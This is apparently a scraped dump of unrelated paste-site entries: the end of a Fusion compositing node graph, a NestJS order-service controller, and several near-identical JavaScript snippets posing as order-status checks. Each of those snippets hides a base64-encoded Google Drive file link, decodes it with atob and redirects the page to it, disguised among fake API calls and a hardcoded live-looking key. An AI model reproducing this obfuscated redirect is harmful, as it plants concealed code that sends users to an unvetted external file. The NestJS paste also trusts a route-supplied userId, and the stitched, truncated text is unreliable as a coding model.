							{ Linear = true, X = 0.375, Y = -0.250517330574237, LX = 0, LY = 0.021005776858079, RX = -0.0208333333333333, RY = 0 },
							{ Linear = true, X = 0.3125, Y = -0.250517330574237, LX = 0.0208333333333333, LY = 0, RX = 0, RY = 0.0208333333333333 },
							{ Linear = true, X = 0.3125, Y = -0.188017330574237, LX = 0, LY = -0.0208333333333333, RX = -0.0208333333333333, RY = 0.000172443524745649 },
							{ Linear = true, X = 0.25, Y = -0.1875, LX = 0.0208333333333333, LY = -0.000172443524745649, RX = -0.000427350427350426, RY = 0.0829059829059829 },
							{ Linear = true, X = 0.248717948717949, Y = 0.0612179487179487, LX = 0.000427350427350426, LY = -0.0829059829059829, RX = -0.0204059829059829, RY = 0.000427350427350428 },
							{ Linear = true, X = 0.1875, Y = 0.0625, LX = 0.0204059829059829, LY = -0.000427350427350428, RX = -0.00016166580444904, RY = -0.0208872219348163 },
							{ Linear = true, X = 0.187015002586653, Y = -0.000161665804449043, LX = 0.00016166580444904, LY = 0.0208872219348163, RX = -0.0206716675288843, RY = 5.38886014830143e-05 },
							{ Linear = true, X = 0.125, Y = 0, LX = 0.0206716675288843, LY = -5.38886014830143e-05, RX = 0, RY = -0.0208333333333333 },
							{ Linear = true, X = 0.125, Y = -0.0625, LX = 0, LY = 0.0208333333333333, RX = -0.0208333333333333, RY = 0 },
							{ Linear = true, X = 0.0625, Y = -0.0625, LX = 0.0208333333333333, LY = 0, RX = 0, RY = -0.0208333333333333 },
							{ Linear = true, X = 0.0625, Y = -0.125, LX = 0, LY = 0.0208333333333333, RX = -0.0208333333333333, RY = 0 },
							{ Linear = true, X = 0, Y = -0.125, LX = 0.0208333333333333, LY = 0, RX = 0, RY = -0.0208333333333333 },
							{ Linear = true, X = 0, Y = -0.1875, LX = 0, LY = 0.0208333333333333, RX = -0.0208333333333333, RY = 0 },
							{ Linear = true, X = -0.0625, Y = -0.1875, LX = 0.0208333333333333, LY = 0, RX = 0, RY = -0.0208333333333333 },
							{ Linear = true, X = -0.0625, Y = -0.25, LX = 0, LY = 0.0208333333333333, RX = -0.0208333333333333, RY = 0 },
							{ Linear = true, X = -0.125, Y = -0.25, LX = 0.0208333333333333, LY = 0, RX = 0, RY = -0.0208333333333333 },
							{ Linear = true, X = -0.125, Y = -0.3125, LX = 0, LY = 0.0208333333333333, RX = -0.0208333333333333, RY = 0 },
							{ Linear = true, X = -0.1875, Y = -0.3125, LX = 0.0208333333333333, LY = 0, RX = 0, RY = -0.021005776858079 },
							{ Linear = true, X = -0.1875, Y = -0.375517330574237, LX = 0, LY = 0.021005776858079, RX = -0.0208333333333333, RY = 0.000172443524745639 },
							{ Linear = true, X = -0.25, Y = -0.375, LX = 0.0208333333333333, LY = -0.000172443524745639, RX = 0, RY = -0.0208333333333333 },
							{ Linear = true, X = -0.25, Y = -0.4375, LX = 0, LY = 0.0208333333333333, RX = -0.0417744438696327, RY = -0.000140110363855842 }
						}
					} },
				[191] = { 4, LH = { 168, 3.66666666666667 }, RH = { 194, 4.33333333333333 }, Flags = { Linear = true, LockedY = true }, Value = Polyline {
						Closed = true,
						Points = {
							{ Linear = true, X = -0.375323331608898, Y = -0.437920331091568, LX = 0.0417744438696327, LY = 0.000140110363855842, RX = -6.37838815677287e-05, RY = 0.0416737001441197 },
							{ Linear = true, X = -0.375514683253601, Y = -0.312899230659209, LX = 6.37838815677287e-05, LY = -0.0416737001441197, RX = 0.0209191996683986, RY = 6.05942278850136e-05 },
							{ Linear = true, X = -0.312757084248405, Y = -0.312717447975554, LX = -0.0209191996683986, LY = -6.05942278850136e-05, RX = 4.35092048931551e-05, RY = 0.0207654344614719 },
							{ Linear = true, X = -0.312626556633726, Y = -0.250421144591138, LX = -4.35092048931551e-05, LY = -0.0207654344614719, RX = 0.0207809261896367, RY = 0.000102510137951151 },
							{ Linear = true, X = -0.250283778064816, Y = -0.250113614177284, LX = -0.0207809261896367, LY = -0.000102510137951151, RX = -7.78508364736215e-05, RY = 0.0208712047257615 },
							{ Linear = true, X = -0.250517330574237, Y = -0.1875, LX = 7.78508364736215e-05, LY = -0.0208712047257615, RX = 0.0209164622520956, RY = -8.46403536489126e-05 },
							{ Linear = true, X = -0.18776794381795, Y = -0.187753921060947, LX = -0.0209164622520956, LY = 8.46403536489126e-05, RX = 8.93146059833353e-05, RY = 0.0209179736869822 },
							{ Linear = true, X = -0.1875, Y = -0.125, LX = -8.93146059833353e-05, LY = -0.0209179736869822, RX = 0.0206824452491809, RY = -0.000150888084152432 },
							{ Linear = true, X = -0.125452664252457, Y = -0.125452664252457, LX = -0.0206824452491809, LY = 0.000150888084152432, RX = 0, RY = 0.0208656664942231 },
							{ Linear = true, X = -0.125452664252457, Y = -0.0628556647697879, LX = 0, LY = -0.0208656664942231, RX = 0.0209842214174858, RY = 0.000118554923262631 },
							{ Linear = true, X = -0.0625, Y = -0.0625, LX = -0.0209842214174858, LY = -0.000118554923262631, RX = 0, RY = 0.0208333333333333 },
							{ Linear = true, X = -0.0625, Y = 0, LX = 0, LY = -0.0208333333333333, RX = 0.0208333333333333, RY = 0 },
							{ Linear = true, X = 0, Y = 0, LX = -0.0208333333333333, LY = 0, RX = 0, RY = 0.0208333333333333 },
							{ Linear = true, X = 0, Y = 0.0625, LX = 0, LY = -0.0208333333333333, RX = 0.0208333333333333, RY = 0 },
							{ Linear = true, X = 0.0625, Y = 0.0625, LX = -0.0208333333333333, LY = 0, RX = 0, RY = 0.0208333333333333 },
							{ Linear = true, X = 0.0625, Y = 0.125, LX = 0, LY = -0.0208333333333333, RX = 0.0208333333333333, RY = 0 },
							{ Linear = true, X = 0.125, Y = 0.125, LX = -0.0208333333333333, LY = 0, RX = -4.93096646942799e-05, RY = 0.0208333333333333 },
							{ Linear = true, X = 0.124852071005917, Y = 0.1875, LX = 4.93096646942799e-05, LY = -0.0208333333333333, RX = -0.083284023668639, RY = 0 },
							{ Linear = true, X = -0.125, Y = 0.1875, LX = 0.083284023668639, LY = 0, RX = 0, RY = 0.0208333333333333 },
							{ Linear = true, X = -0.125, Y = 0.25, LX = 0, LY = -0.0208333333333333, RX = -0.0208333333333333, RY = 0 },
							{ Linear = true, X = -0.1875, Y = 0.25, LX = 0.0208333333333333, LY = 0, RX = 0, RY = 0.0208333333333333 },
							{ Linear = true, X = -0.1875, Y = 0.3125, LX = 0, LY = -0.0208333333333333, RX = 0.0208333333333333, RY = 0 },
							{ Linear = true, X = -0.125, Y = 0.3125, LX = -0.0208333333333333, LY = 0, RX = 0, RY = 0.0208333333333333 },
							{ Linear = true, X = -0.125, Y = 0.375, LX = 0, LY = -0.0208333333333333, RX = 0.104166666666667, RY = 0 },
							{ Linear = true, X = 0.1875, Y = 0.375, LX = -0.104166666666667, LY = 0, RX = 0, RY = -0.0208333333333333 },
							{ Linear = true, X = 0.1875, Y = 0.3125, LX = 0, LY = 0.0208333333333333, RX = 0.0625, RY = 0 },
							{ Linear = true, X = 0.375, Y = 0.3125, LX = -0.0625, LY = 0, RX = -6.46663217796125e-05, RY = -0.0625215554405932 },
							{ Linear = true, X = 0.374806001034661, Y = 0.12493533367822, LX = 6.46663217796125e-05, LY = 0.0625215554405932, RX = 0.0208979996551129, RY = 2.15554405932072e-05 },
							{ Linear = true, X = 0.4375, Y = 0.125, LX = -0.0208979996551129, LY = -2.15554405932072e-05, RX = 0, RY = -0.104166666666667 },
							{ Linear = true, X = 0.4375, Y = -0.1875, LX = 0, LY = 0.104166666666667, RX = -0.0199786324786325, RY = -0.000854700854700852 },
							{ Linear = true, X = 0.377564102564103, Y = -0.190064102564103, LX = 0.0199786324786325, LY = 0.000854700854700852, RX = -0.000854700854700852, RY = -0.0201510760033781 },
							{ Linear = true, X = 0.375, Y = -0.250517330574237, LX = 0.000854700854700852, LY = 0.0201510760033781, RX = -0.0208333333333333, RY = 0 },
							{ Linear = true, X = 0.3125, Y = -0.250517330574237, LX = 0.0208333333333333, LY = 0, RX = 0, RY = 0.0208333333333333 },
							{ Linear = true, X = 0.3125, Y = -0.188017330574237, LX = 0, LY = -0.0208333333333333, RX = -0.0208333333333333, RY = 0.000172443524745649 },
							{ Linear = true, X = 0.25, Y = -0.1875, LX = 0.0208333333333333, LY = -0.000172443524745649, RX = -4.93096646942799e-05, RY = 0.083284023668639 },
							{ Linear = true, X = 0.249852071005917, Y = 0.0623520710059172, LX = 4.93096646942799e-05, LY = -0.083284023668639, RX = -0.0207840236686391, RY = 4.93096646942802e-05 },
							{ Linear = true, X = 0.1875, Y = 0.0625, LX = 0.0207840236686391, LY = -4.93096646942802e-05, RX = -0.00016166580444904, RY = -0.0208872219348163 },
							{ Linear = true, X = 0.187015002586653, Y = -0.000161665804449043, LX = 0.00016166580444904, LY = 0.0208872219348163, RX = -0.0206716675288843, RY = 5.38886014830143e-05 },
							{ Linear = true, X = 0.125, Y = 0, LX = 0.0206716675288843, LY = -5.38886014830143e-05, RX = 0, RY = -0.0208333333333333 },
							{ Linear = true, X = 0.125, Y = -0.0625, LX = 0, LY = 0.0208333333333333, RX = -0.0208333333333333, RY = 0 },
							{ Linear = true, X = 0.0625, Y = -0.0625, LX = 0.0208333333333333, LY = 0, RX = 0, RY = -0.0208333333333333 },
							{ Linear = true, X = 0.0625, Y = -0.125, LX = 0, LY = 0.0208333333333333, RX = -0.0208333333333333, RY = 0 },
							{ Linear = true, X = 0, Y = -0.125, LX = 0.0208333333333333, LY = 0, RX = 0, RY = -0.0208333333333333 },
							{ Linear = true, X = 0, Y = -0.1875, LX = 0, LY = 0.0208333333333333, RX = -0.0208333333333333, RY = 0 },
							{ Linear = true, X = -0.0625, Y = -0.1875, LX = 0.0208333333333333, LY = 0, RX = 0, RY = -0.0208333333333333 },
							{ Linear = true, X = -0.0625, Y = -0.25, LX = 0, LY = 0.0208333333333333, RX = -0.0208333333333333, RY = 0 },
							{ Linear = true, X = -0.125, Y = -0.25, LX = 0.0208333333333333, LY = 0, RX = 0, RY = -0.0208333333333333 },
							{ Linear = true, X = -0.125, Y = -0.3125, LX = 0, LY = 0.0208333333333333, RX = -0.0208333333333333, RY = 0 },
							{ Linear = true, X = -0.1875, Y = -0.3125, LX = 0.0208333333333333, LY = 0, RX = 0, RY = -0.021005776858079 },
							{ Linear = true, X = -0.1875, Y = -0.375517330574237, LX = 0, LY = 0.021005776858079, RX = -0.0208333333333333, RY = 0.000172443524745639 },
							{ Linear = true, X = -0.25, Y = -0.375, LX = 0.0208333333333333, LY = -0.000172443524745639, RX = 0, RY = -0.0208333333333333 },
							{ Linear = true, X = -0.25, Y = -0.4375, LX = 0, LY = 0.0208333333333333, RX = -0.0417744438696327, RY = -0.000140110363855842 }
						}
					} },
				[200] = { 5, LH = { 197, 4.66666666666667 }, Flags = { Linear = true, LockedY = true }, Value = Polyline {
						Closed = true,
						Points = {
							{ Linear = true, X = -0.375323331608898, Y = -0.437920331091568, LX = 0.0417744438696327, LY = 0.000140110363855842, RX = -6.37838815677287e-05, RY = 0.0416737001441197 },
							{ Linear = true, X = -0.375514683253601, Y = -0.312899230659209, LX = 6.37838815677287e-05, LY = -0.0416737001441197, RX = 0.0209191996683986, RY = 6.05942278850136e-05 },
							{ Linear = true, X = -0.312757084248405, Y = -0.312717447975554, LX = -0.0209191996683986, LY = -6.05942278850136e-05, RX = 4.35092048931551e-05, RY = 0.0207654344614719 },
							{ Linear = true, X = -0.312626556633726, Y = -0.250421144591138, LX = -4.35092048931551e-05, LY = -0.0207654344614719, RX = 0.0207809261896367, RY = 0.000102510137951151 },
							{ Linear = true, X = -0.250283778064816, Y = -0.250113614177284, LX = -0.0207809261896367, LY = -0.000102510137951151, RX = -7.78508364736215e-05, RY = 0.0208712047257615 },
							{ Linear = true, X = -0.250517330574237, Y = -0.1875, LX = 7.78508364736215e-05, LY = -0.0208712047257615, RX = 0.0209164622520956, RY = -8.46403536489126e-05 },
							{ Linear = true, X = -0.18776794381795, Y = -0.187753921060947, LX = -0.0209164622520956, LY = 8.46403536489126e-05, RX = 8.93146059833353e-05, RY = 0.0209179736869822 },
							{ Linear = true, X = -0.1875, Y = -0.125, LX = -8.93146059833353e-05, LY = -0.0209179736869822, RX = 0.0206824452491809, RY = -0.000150888084152432 },
							{ Linear = true, X = -0.125452664252457, Y = -0.125452664252457, LX = -0.0206824452491809, LY = 0.000150888084152432, RX = 0, RY = 0.0208656664942231 },
							{ Linear = true, X = -0.125452664252457, Y = -0.0628556647697879, LX = 0, LY = -0.0208656664942231, RX = 0.0209842214174858, RY = 0.000118554923262631 },
							{ Linear = true, X = -0.0625, Y = -0.0625, LX = -0.0209842214174858, LY = -0.000118554923262631, RX = 0, RY = 0.0208333333333333 },
							{ Linear = true, X = -0.0625, Y = 0, LX = 0, LY = -0.0208333333333333, RX = 0.0208333333333333, RY = 0 },
							{ Linear = true, X = 0, Y = 0, LX = -0.0208333333333333, LY = 0, RX = 0, RY = 0.0208333333333333 },
							{ Linear = true, X = 0, Y = 0.0625, LX = 0, LY = -0.0208333333333333, RX = 0.0208333333333333, RY = 0 },
							{ Linear = true, X = 0.0625, Y = 0.0625, LX = -0.0208333333333333, LY = 0, RX = 0, RY = 0.0208333333333333 },
							{ Linear = true, X = 0.0625, Y = 0.125, LX = 0, LY = -0.0208333333333333, RX = 0.0208333333333333, RY = 0 },
							{ Linear = true, X = 0.125, Y = 0.125, LX = -0.0208333333333333, LY = 0, RX = 0, RY = 0.0208333333333333 },
							{ Linear = true, X = 0.125, Y = 0.1875, LX = 0, LY = -0.0208333333333333, RX = -0.0833333333333333, RY = 0 },
							{ Linear = true, X = -0.125, Y = 0.1875, LX = 0.0833333333333333, LY = 0, RX = 0, RY = 0.0208333333333333 },
							{ Linear = true, X = -0.125, Y = 0.25, LX = 0, LY = -0.0208333333333333, RX = -0.0208333333333333, RY = 0 },
							{ Linear = true, X = -0.1875, Y = 0.25, LX = 0.0208333333333333, LY = 0, RX = 0, RY = 0.0208333333333333 },
							{ Linear = true, X = -0.1875, Y = 0.3125, LX = 0, LY = -0.0208333333333333, RX = 0.0208333333333333, RY = 0 },
							{ Linear = true, X = -0.125, Y = 0.3125, LX = -0.0208333333333333, LY = 0, RX = 0, RY = 0.0208333333333333 },
							{ Linear = true, X = -0.125, Y = 0.375, LX = 0, LY = -0.0208333333333333, RX = 0.104166666666667, RY = 0 },
							{ Linear = true, X = 0.1875, Y = 0.375, LX = -0.104166666666667, LY = 0, RX = 0, RY = -0.0208333333333333 },
							{ Linear = true, X = 0.1875, Y = 0.3125, LX = 0, LY = 0.0208333333333333, RX = 0.0625, RY = 0 },
							{ Linear = true, X = 0.375, Y = 0.3125, LX = -0.0625, LY = 0, RX = -6.46663217796125e-05, RY = -0.0625215554405932 },
							{ Linear = true, X = 0.374806001034661, Y = 0.12493533367822, LX = 6.46663217796125e-05, LY = 0.0625215554405932, RX = 0.0208979996551129, RY = 2.15554405932072e-05 },
							{ Linear = true, X = 0.4375, Y = 0.125, LX = -0.0208979996551129, LY = -2.15554405932072e-05, RX = 0, RY = -0.104166666666667 },
							{ Linear = true, X = 0.4375, Y = -0.1875, LX = 0, LY = 0.104166666666667, RX = -0.0208333333333333, RY = 0 },
							{ Linear = true, X = 0.375, Y = -0.1875, LX = 0.0208333333333333, LY = 0, RX = 0, RY = -0.021005776858079 },
							{ Linear = true, X = 0.375, Y = -0.250517330574237, LX = 0, LY = 0.021005776858079, RX = -0.0208333333333333, RY = 0 },
							{ Linear = true, X = 0.3125, Y = -0.250517330574237, LX = 0.0208333333333333, LY = 0, RX = 0, RY = 0.0208333333333333 },
							{ Linear = true, X = 0.3125, Y = -0.188017330574237, LX = 0, LY = -0.0208333333333333, RX = -0.0208333333333333, RY = 0.000172443524745649 },
							{ Linear = true, X = 0.25, Y = -0.1875, LX = 0.0208333333333333, LY = -0.000172443524745649, RX = 0, RY = 0.0833333333333333 },
							{ Linear = true, X = 0.25, Y = 0.0625, LX = 0, LY = -0.0833333333333333, RX = -0.0208333333333333, RY = 0 },
							{ Linear = true, X = 0.1875, Y = 0.0625, LX = 0.0208333333333333, LY = 0, RX = -0.00016166580444904, RY = -0.0208872219348163 },
							{ Linear = true, X = 0.187015002586653, Y = -0.000161665804449043, LX = 0.00016166580444904, LY = 0.0208872219348163, RX = -0.0206716675288843, RY = 5.38886014830143e-05 },
							{ Linear = true, X = 0.125, Y = 0, LX = 0.0206716675288843, LY = -5.38886014830143e-05, RX = 0, RY = -0.0208333333333333 },
							{ Linear = true, X = 0.125, Y = -0.0625, LX = 0, LY = 0.0208333333333333, RX = -0.0208333333333333, RY = 0 },
							{ Linear = true, X = 0.0625, Y = -0.0625, LX = 0.0208333333333333, LY = 0, RX = 0, RY = -0.0208333333333333 },
							{ Linear = true, X = 0.0625, Y = -0.125, LX = 0, LY = 0.0208333333333333, RX = -0.0208333333333333, RY = 0 },
							{ Linear = true, X = 0, Y = -0.125, LX = 0.0208333333333333, LY = 0, RX = 0, RY = -0.0208333333333333 },
							{ Linear = true, X = 0, Y = -0.1875, LX = 0, LY = 0.0208333333333333, RX = -0.0208333333333333, RY = 0 },
							{ Linear = true, X = -0.0625, Y = -0.1875, LX = 0.0208333333333333, LY = 0, RX = 0, RY = -0.0208333333333333 },
							{ Linear = true, X = -0.0625, Y = -0.25, LX = 0, LY = 0.0208333333333333, RX = -0.0208333333333333, RY = 0 },
							{ Linear = true, X = -0.125, Y = -0.25, LX = 0.0208333333333333, LY = 0, RX = 0, RY = -0.0208333333333333 },
							{ Linear = true, X = -0.125, Y = -0.3125, LX = 0, LY = 0.0208333333333333, RX = -0.0208333333333333, RY = 0 },
							{ Linear = true, X = -0.1875, Y = -0.3125, LX = 0.0208333333333333, LY = 0, RX = 0, RY = -0.021005776858079 },
							{ Linear = true, X = -0.1875, Y = -0.375517330574237, LX = 0, LY = 0.021005776858079, RX = -0.0208333333333333, RY = 0.000172443524745639 },
							{ Linear = true, X = -0.25, Y = -0.375, LX = 0.0208333333333333, LY = -0.000172443524745639, RX = 0, RY = -0.0208333333333333 },
							{ Linear = true, X = -0.25, Y = -0.4375, LX = 0, LY = 0.0208333333333333, RX = -0.0417744438696327, RY = -0.000140110363855842 }
						}
					} }
			}
		},
		PointLight1_3 = LightPoint {
			Inputs = {
				[""Transform3DOp.Translate.X""] = Input { Value = 0.63235734207, },
				[""Transform3DOp.Translate.Y""] = Input { Value = -0.422399848188767, },
				[""Transform3DOp.Translate.Z""] = Input { Value = 0.572625325049228, },
				Green = Input { Value = 0.83928, },
				Blue = Input { Value = 0.426, },
				Intensity = Input { Value = 0.614, },
				DecayType = Input { Value = 2, },
				[""ShadowLightInputs3D.ShadowsEnabled""] = Input { Value = 1, },
				[""ShadowLightInputs3D.ShadowMapSize""] = Input { Value = 2048, }
			},
			ViewInfo = OperatorInfo { Pos = { -2805, 2029.5 } },
		},
		Camera3D1_1 = Camera3D {
			Inputs = {
				[""Transform3DOp.Translate.X""] = Input { Value = 2.43354366622133, },
				[""Transform3DOp.Translate.Y""] = Input { Value = 0.970594333060471, },
				[""Transform3DOp.Translate.Z""] = Input { Value = 2.31366107565841, },
				[""Transform3DOp.Rotate.X""] = Input { Value = -16.4000015258789, },
				[""Transform3DOp.Rotate.Y""] = Input { Value = 47.5999984741211, },
				FLength = Input { Value = 18.2123442718302, },
				[""Stereo.Mode""] = Input { Value = FuID { ""OffAxis"" }, },
				FilmGate = Input { Value = FuID { ""BMD_URSA_4K_16x9"" }, },
				[""SurfacePlaneInputs.ObjectID.ObjectID""] = Input { Value = 1, },
				[""MtlStdInputs.MaterialID""] = Input { Value = 10, }
			},
			ViewInfo = OperatorInfo { Pos = { -3080, 2029.5 } },
		},
		Merge3D1_1 = Merge3D {
			Inputs = {
				SceneInput1 = Input {
					SourceOp = ""Transform3D1_1"",
					Source = ""Output"",
				},
				SceneInput2 = Input {
					SourceOp = ""PointLight1_3"",
					Source = ""Output"",
				},
				SceneInput3 = Input {
					SourceOp = ""Camera3D1_1"",
					Source = ""Output"",
				},
				SceneInput5 = Input {
					SourceOp = ""PointLight1_2_1"",
					Source = ""Output"",
				},
				SceneInput6 = Input {
					SourceOp = ""AmbientLight1_1"",
					Source = ""Output"",
				},
				SceneInput4 = Input {
					SourceOp = ""PointLight1_1_1"",
					Source = ""Output"",
				}
			},
			ViewInfo = OperatorInfo { Pos = { -2970, 2029.5 } },
		},
		PointLight1_2_1 = LightPoint {
			Inputs = {
				[""Transform3DOp.Translate.X""] = Input { Value = 0.33645475272593, },
				[""Transform3DOp.Translate.Y""] = Input { Value = -0.422399848188767, },
				[""Transform3DOp.Translate.Z""] = Input { Value = -1.15707576129902, },
				Red = Input { Value = 0, },
				Green = Input { Value = 0.976, },
				DecayType = Input { Value = 2, },
				[""ShadowLightInputs3D.ShadowsEnabled""] = Input { Value = 1, },
				[""ShadowLightInputs3D.ShadowMapSize""] = Input { Value = 2048, }
			},
			ViewInfo = OperatorInfo { Pos = { -2805, 2062.5 } },
		},
		Renderer3D2_1 = Renderer3D {
			CustomData = {
				ToolVersion = 2,
			},
			Inputs = {
				[""RendererOpenGL.AntiAliasing.Presets.Aux.Supersampling.HighQuality.Rate""] = Input { Value = 3, },
				[""RendererOpenGL.AntiAliasing.Presets.Color.Supersampling.HighQuality.Rate""] = Input { Value = 3, },
				[""RendererOpenGL.ShadowsEnabled""] = Input { Value = 1, },
				[""RendererOpenGL.AntiAliasing.Presets.Color.Multisampling.HighQuality.SampleCount""] = Input { Value = 3, },
				[""RendererOpenGL.TransparencySorting""] = Input { Value = 1, },
				[""RendererOpenGLUV.ShadowsEnabled""] = Input { Value = 1, },
				[""RendererOpenGL.AntiAliasing.Presets.Aux.Multisampling.HighQuality.SampleCount""] = Input { Value = 3, },
				[""RendererOpenGL.AntiAliasing.Nest""] = Input { Value = 1, },
				[""RendererOpenGL.AntiAliasing.Channels.RGBA.HighQuality.Enable""] = Input { Value = 1, },
				[""RendererOpenGL.AntiAliasing.Presets.Color.Multisampling.LowQuality.SampleCount""] = Input { Value = 2, },
				[""RendererOpenGL.LightingEnabled""] = Input { Value = 1, },
				[""RendererOpenGL.AccumQuality""] = Input { Value = 32, },
				[""RendererOpenGLUV.LightingEnabled""] = Input { Value = 1, },
				[""RendererOpenGL.AntiAliasing.Presets.Aux.Multisampling.LowQuality.SampleCount""] = Input { Value = 2, },
				GlobalOut = Input { Value = 500, },
				Width = Input { Value = 1080, },
				Height = Input { Value = 1080, },
				[""Gamut.SLogVersion""] = Input { Value = FuID { ""SLog2"" }, },
				SceneInput = Input {
					SourceOp = ""Merge3D1_1"",
					Source = ""Output"",
				},
				[""RendererSoftware.Lighting""] = Input { Value = 0, },
				[""RendererSoftware.LightingEnabled""] = Input { Value = 1, },
				[""RendererSoftware.ShadowsEnabled""] = Input { Value = 1, }
			},
			ViewInfo = OperatorInfo { Pos = { -2970, 2095.5 } },
		}
	}
}"
nWn9jbY2,Untitled,Ratqueenkslskskwkw,JavaScript,Wednesday 9th of April 2025 04:47:25 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/01678/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
BF1pu0JK,Products.js,Ratqueenkslskskwkw,JavaScript,Wednesday 9th of April 2025 04:31:55 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/46665/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
1YM9rQqj,Untitled,dangl1n,TypeScript,Wednesday 9th of April 2025 04:17:05 AM CDT,"import { Injectable, Controller, Post, Body, Get, Param, UseGuards, BadRequestException, NotFoundException, UnauthorizedException, Module } from '@nestjs/common';
import { InjectRepository } from '@nestjs/typeorm';
import { Repository, Entity, Column, PrimaryGeneratedColumn, ManyToOne } from 'typeorm';
import { ApiTags, ApiBearerAuth } from '@nestjs/swagger';
import { JwtService } from '@nestjs/jwt';
import { AuthGuard } from '@nestjs/passport';
import { validate } from 'class-validator';
import * as bcrypt from 'bcrypt';
import { IsString, IsEmail, MinLength, IsNumber, IsPositive } from 'class-validator';
import { InjectQueue } from '@nestjs/bull';
import { Queue } from 'bull';

@Entity()
export class User {
  @PrimaryGeneratedColumn()
  id: number;

  @Column()
  @IsString()
  name: string;

  @Column({ unique: true })
  @IsEmail()
  email: string;

  @Column()
  @IsString()
  @MinLength(8)
  password: string;
}

@Entity()
export class Order {
  @PrimaryGeneratedColumn()
  id: number;

  @ManyToOne(() => User, (user) => user.id)
  user: User;

  @Column()
  @IsNumber()
  @IsPositive()
  totalPrice: number;

  @Column({ default: 'pending' })
  status: string;
}


export class CreateOrderDto {
  @IsNumber()
  @IsPositive()
  totalPrice: number;
}

@Injectable()
export class OrderService {
  private readonly saltRounds = 10;

  constructor(
    @InjectRepository(User)
    private readonly userRepository: Repository<User>,
    @InjectRepository(Order)
    private readonly orderRepository: Repository<Order>,
    private readonly jwtService: JwtService,
    @InjectQueue('notifications')
    private readonly notificationQueue: Queue,
  ) {}

  async register(name: string, email: string, password: string): Promise<{ accessToken: string }> {
    const existingUser = await this.userRepository.findOne({ where: { email } });
    if (existingUser) {
      throw new BadRequestException('Email уже занят');
    }

    const hashedPassword = await bcrypt.hash(password, this.saltRounds);
    const user = this.userRepository.create({ name, email, password: hashedPassword });
    await this.userRepository.save(user);

    const payload = { sub: user.id, email: user.email };
    return { accessToken: this.jwtService.sign(payload) };
  }

  async createOrder(userId: number, createOrderDto: CreateOrderDto): Promise<Order> {
    const user = await this.userRepository.findOne({ where: { id: userId } });
    if (!user) {
      throw new NotFoundException('Пользователь не найден');
    }

    const errors = await validate(createOrderDto);
    if (errors.length > 0) {
      throw new BadRequestException('Некорректные данные заказа');
    }

    let { totalPrice } = createOrderDto;

    if (totalPrice > 1000) {
      totalPrice *= 0.9; // скидка
    }

    const order = this.orderRepository.create({ user, totalPrice, status: 'pending' });
    await this.orderRepository.save(order);

    await this.notificationQueue.add('sendOrderConfirmation', {
      userId: user.id,
      orderId: order.id,
      email: user.email,
    });

    return order;
  }

  async getOrderStatus(orderId: number): Promise<string> {
    const order = await this.orderRepository.findOne({ where: { id: orderId } });
    if (!order) {
      throw new NotFoundException('Заказ не найден');
    }
    return order.status;
  }

  async updateOrderStatus(orderId: number, status: string): Promise<void> {
    const order = await this.orderRepository.findOne({ where: { id: orderId } });
    if (!order) {
      throw new NotFoundException('Заказ не найден');
    }

    order.status = status;
    await this.orderRepository.save(order);

    if (status === 'completed') {
      await this.notificationQueue.add('sendOrderCompleted', {
        orderId: order.id,
        email: order.user.email,
      });
    }
  }
}

@ApiTags('orders')
@Controller('orders')
export class OrderController {
  constructor(private readonly orderService: OrderService) {}

  @Post('register')
  async register(@Body() body: { name: string; email: string; password: string }) {
    return this.orderService.register(body.name, body.email, body.password);
  }

  @Post()
  @UseGuards(AuthGuard('jwt'))
  @ApiBearerAuth()
  async createOrder(@Body() createOrderDto: CreateOrderDto, @Param('userId') userId: number) {
    return this.orderService.createOrder(userId, createOrderDto);
  }

  @Get(':orderId/status')
  @UseGuards(AuthGuard('jwt'))
  @ApiBearerAuth()
  async getOrderStatus(@Param('orderId') orderId: string) {
    return this.orderService.getOrderStatus(+orderId);
  }

  @Post(':orderId/status')
  @UseGuards(AuthGuard('jwt'))
  @ApiBearerAuth()
  async updateOrderStatus(@Param('orderId') orderId: string, @Body('status') status: string) {
    await this.orderService.updateOrderStatus(+orderId, status);
    return { message: 'Статус обновлен' };
  }
}

@Module({
  providers: [OrderService],
  controllers: [OrderController],
})
export class AppModule {}"
ajmtUnkB,Order.js,Ratqueenkslskskwkw,JavaScript,Wednesday 9th of April 2025 04:16:33 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/48240/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
